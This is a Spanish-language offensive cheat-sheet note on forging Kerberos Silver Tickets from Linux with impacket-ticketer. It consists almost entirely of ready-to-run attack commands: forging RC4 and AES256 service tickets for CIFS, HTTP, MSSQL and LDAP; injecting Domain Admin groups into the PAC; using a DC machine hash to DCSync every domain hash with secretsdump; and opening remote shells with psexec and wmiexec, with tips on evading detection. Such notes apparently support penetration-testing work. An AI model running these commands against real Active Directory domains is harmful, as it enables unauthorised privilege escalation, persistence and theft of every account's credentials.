---
aliases:
  - Silver Ticket Linux
  - impacket-ticketer silver
tags:
  - technique/persistence
  - technique/kerberos
  - env/linux
  - asset/active-directory
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Silver Ticket]]"
---

# Silver Ticket - Forging Linux

***

## impacket-ticketer — RC4

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-ticketer -nthash HASH -domain-sid SID -domain corp.local -spn cifs/host.corp.local administrator` | TGS forjado para CIFS en RC4 | Standard — file share / SMB. |
| `impacket-ticketer -nthash HASH -domain-sid SID -domain corp.local -spn http/host.corp.local administrator` | TGS para HTTP/WinRM | WinRM / IIS. |
| `impacket-ticketer -nthash HASH -domain-sid SID -domain corp.local -spn mssqlsvc/host.corp.local:1433 administrator` | TGS para MSSQL | SQL Kerberos auth. |
| `impacket-ticketer -nthash HASH -domain-sid SID -domain corp.local -spn ldap/dc.corp.local administrator` | TGS para LDAP (DCSync sin DA) | DC$ hash → secretsdump. |
^st-forge-linux-rc4

```bash
impacket-ticketer \
  -nthash abc123COMPUTERHASH \
  -domain-sid S-1-5-21-1234567890-987654321-111222333 \
  -domain corp.local \
  -spn cifs/web01.corp.local \
  administrator

# → administrator.ccache
export KRB5CCNAME=administrator.ccache
klist
```

___

## impacket-ticketer — AES256 (OPSEC)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-ticketer -aesKey AES256 -domain-sid SID -domain corp.local -spn cifs/host.corp.local administrator` | TGS AES256 — sin downgrade RC4 | OPSEC en dominios AES-only. |
| `impacket-ticketer -aesKey AES256 ... -user-id 500 -groups 513,512 administrator` | Con RID + groups | PAC coherente. |
^st-forge-linux-aes

```bash
impacket-ticketer \
  -aesKey DEF456AES256KEYHERE \
  -domain-sid S-1-5-21-... \
  -domain corp.local \
  -spn cifs/web01.corp.local \
  -user-id 500 \
  administrator

export KRB5CCNAME=administrator.ccache
```

___

## Flags avanzados

| **Flag** | **Valor** | **Efecto** |
|:---:|:---:|:---:|
| `-spn <SPN>` | `cifs/host.corp.local` | Servicio objetivo — obligatorio para silver. |
| `-user-id <RID>` | `500` | RID del usuario en PAC. |
| `-groups <list>` | `513,512` | Domain Users + DA en PAC. |
| `-duration <h>` | `87600` (10 años) → `24` (realista) | Lifetime del TGS. |
| `-ts` | flag | Timezone fix. |
^st-forge-linux-flags

___

## DCSync via Silver Ticket (LDAP)

| **Paso** | **Comando** | **Cuándo** |
|:---:|:---:|:---:|
| Forge TGS para ldap/ con DC$ hash | `impacket-ticketer -nthash DC_HASH -spn ldap/dc.corp.local administrator` | Tenés hash de DC$ pero no DA. |
| Exportar ccache | `export KRB5CCNAME=administrator.ccache` | Post-forge. |
| DCSync via silver LDAP | `impacket-secretsdump -k -no-pass corp.local/administrator@dc.corp.local -just-dc` | Full domain dump. |
^st-forge-linux-dcsync

```bash
# DC$ hash → forjar TGS LDAP → DCSync sin ser DA
impacket-ticketer \
  -nthash DC_COMPUTER_HASH \
  -domain-sid S-1-5-21-... \
  -domain corp.local \
  -spn ldap/dc01.corp.local \
  administrator

export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass corp.local/administrator@dc01.corp.local -just-dc-ntlm
```

___

## Verificar y usar

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `klist` | Ticket en ccache — SPN, validity | Post-forge. |
| `impacket-smbclient -k -no-pass corp.local/administrator@web01.corp.local` | Acceso SMB si TGS válido | Test rápido cifs/. |
| `impacket-psexec -k -no-pass corp.local/administrator@web01.corp.local` | Shell RCE | Post-cifs silver. |
| `impacket-wmiexec -k -no-pass corp.local/administrator@web01.corp.local` | Shell WMI | Post-host silver. |
^st-forge-linux-verify

```bash
export KRB5CCNAME=administrator.ccache
klist
# Service principal: cifs/web01.corp.local@CORP.LOCAL

impacket-smbclient -k -no-pass corp.local/administrator@web01.corp.local
# smb: \> ls
```

***
